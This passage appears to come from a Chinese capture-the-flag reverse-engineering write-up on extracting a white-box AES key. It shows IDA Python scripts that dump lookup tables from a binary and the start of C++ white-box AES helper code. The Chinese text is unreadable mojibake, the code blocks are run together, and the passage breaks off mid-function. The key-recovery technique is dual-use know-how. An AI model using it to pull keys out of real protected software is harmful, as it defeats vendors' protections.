</span></span></code></pre></td></tr></table></div></div><p>ç„¶åæ˜¯ç™½ç›’AESï¼Œéœ€è¦æå–å¯†é’¥ï¼Œå…³æ³¨åˆ°sub_3FD0ä¸­çš„unk_6FA4å¤§å°æ˜¯163840ï¼Œæ­£å¥½æ˜¯4<em>10</em>16<em>256ï¼Œunk_2EFA4å¤§å°æ˜¯4096ï¼Œæ­£å¥½æ˜¯16</em>256ï¼Œç»“åˆaesç™½ç›’æ¿å­è¦å¾—åˆ°tyiboxå’Œtboxï¼Œidcæå–æ•°æ®å¡«å…¥å³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>idc</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ida_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å‚æ•°é…ç½®</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=mh>0x6FA4</span>
</span></span><span class=line><span class=cl><span class=n>dim1</span><span class=p>,</span> <span class=n>dim2</span><span class=p>,</span> <span class=n>dim3</span> <span class=o>=</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=n>total_u32</span> <span class=o>=</span> <span class=n>dim1</span> <span class=o>*</span> <span class=n>dim2</span> <span class=o>*</span> <span class=n>dim3</span>
</span></span><span class=line><span class=cl><span class=n>byte_count</span> <span class=o>=</span> <span class=n>total_u32</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ç›®æ ‡è¾“å‡ºè·¯å¾„ï¼ˆæ³¨æ„ Windows è·¯å¾„åæ–œæ ï¼‰</span>
</span></span><span class=line><span class=cl><span class=n>output_path</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;tyibox.txt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è¯»å–å†…å­˜å—</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>ida_bytes</span><span class=o>.</span><span class=n>get_bytes</span><span class=p>(</span><span class=n>base</span><span class=p>,</span> <span class=n>byte_count</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>data</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;è¯»å–åœ°å€å¤±è´¥ï¼è¯·æ£€æŸ¥åœ°å€æ˜¯å¦æœ‰æ•ˆã€‚&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_path</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;uint32_t tyibox[10][16][256] = {</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dim1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;  {</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>  <span class=c1># tyibox[i]</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dim2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;    {&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>line</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dim3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>offset</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>                    <span class=n>u32val</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>offset</span><span class=p>:</span><span class=n>offset</span><span class=o>+</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;little&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>line</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;0x</span><span class=si>{</span><span class=n>u32val</span><span class=si>:</span><span class=s2>08X</span><span class=si>}</span><span class=s2>, &#34;</span>
</span></span><span class=line><span class=cl>                    <span class=n>idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=c1># å»æ‰ç»“å°¾å¤šä½™é€—å·</span>
</span></span><span class=line><span class=cl>                <span class=n>line</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;, &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;},</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;  },</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;};</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å¯¼å‡ºæˆåŠŸï¼å·²å†™å…¥åˆ°: </span><span class=si>{</span><span class=n>output_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>idc</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ida_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å‚æ•°é…ç½®</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=mh>0x2EFA4</span>  <span class=c1># å¯¹åº” unk_2EFA4</span>
</span></span><span class=line><span class=cl><span class=n>dim1</span><span class=p>,</span> <span class=n>dim2</span> <span class=o>=</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=n>total_bytes</span> <span class=o>=</span> <span class=n>dim1</span> <span class=o>*</span> <span class=n>dim2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è¾“å‡ºæ–‡ä»¶è·¯å¾„</span>
</span></span><span class=line><span class=cl><span class=n>output_path</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;tbox.txt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è¯»å–å­—èŠ‚æ•°æ®</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>ida_bytes</span><span class=o>.</span><span class=n>get_bytes</span><span class=p>(</span><span class=n>base</span><span class=p>,</span> <span class=n>total_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>data</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;è¯»å–åœ°å€ 0x</span><span class=si>{</span><span class=n>base</span><span class=si>:</span><span class=s2>X</span><span class=si>}</span><span class=s2> å¤±è´¥ï¼&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_path</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;uint8_t tbox[16][256] = {</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dim1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;  {&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>row</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dim2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>val</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=n>dim2</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>row</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>02X</span><span class=si>}</span><span class=s2>, &#34;</span>
</span></span><span class=line><span class=cl>            <span class=n>row</span> <span class=o>=</span> <span class=n>row</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;, &#34;</span><span class=p>)</span>  <span class=c1># å»æ‰æœ€åä¸€ä¸ªé€—å·</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>row</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;},</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;};</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å¯¼å‡ºæˆåŠŸï¼Œå†™å…¥åˆ°: </span><span class=si>{</span><span class=n>output_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#include&lt;iostream&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include&lt;cstdlib&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include&lt;cmath&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include&lt;string&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include&lt;windows.h&gt;</span>
</span></span><span class=line><span class=cl><span class=n>using</span> <span class=n>namespace</span> <span class=n>std</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;string.h&gt;</span>
</span></span><span class=line><span class=cl><span class=n>typedef</span> <span class=n>unsigned</span> <span class=n>char</span> <span class=n>u8</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>typedef</span> <span class=n>unsigned</span> <span class=nb>int</span> <span class=n>u32</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>u8</span> <span class=n>gmul</span><span class=p>(</span><span class=n>u8</span> <span class=n>ap</span><span class=p>,</span> <span class=n>u8</span> <span class=n>bp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>u8</span> <span class=n>p</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>ap</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=n>bp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=n>a</span> <span class=o>!=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>b</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>b</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=n>p</span> <span class=o>^=</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>a</span> <span class=o>&amp;</span> <span class=mh>0x80</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>a</span> <span class=o>=</span> <span class=p>(</span><span class=n>a</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=mh>0x1b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=n>a</span> <span class=o>&lt;&lt;=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>p</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>shiftRows</span><span class=p>(</span><span class=n>u8</span> <span class=n>state</span><span class=p>[</span><span class=mi>16</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>u8</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>9</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>13</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>tmp</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>tmp</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>14</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>tmp</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>11</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=n>state</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>state</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>add_round_shiftkey</span><span class=p>(</span><span class=n>u8</span> <span class=n>state</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>u32</span> <span class=n>expandedKey</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>^=</span> <span class=p>(</span><span class=n>expandedKey</span><span class=p>[(</span><span class=n>j</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>24</span> <span class=o>-</span> <span class=mi>8</span> <span class=o>*</span> <span class=n>j</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>add_round_key</span><span class=p>(</span><span class=n>u8</span> <span class=n>state</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>u32</span> <span class=n>expandedKey</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>^=</span> <span class=p>(</span><span class=n>expandedKey</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>24</span> <span class=o>-</span> <span class=mi>8</span> <span class=o>*</span> <span class=n>j</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>getXorTable</span><span class=p>(</span><span class=n>u8</span> <span class=n>table</span><span class=p>[</span><span class=mi>16</span><span class=p>][</span><span class=mi>16</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>table</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span> <span class=o>^</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>getTyiTable</span><span class=p>(</span><span class=n>u8</span> <span class=n>table</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>256</span><span class=p>][</span><span class=mi>4</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>256</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
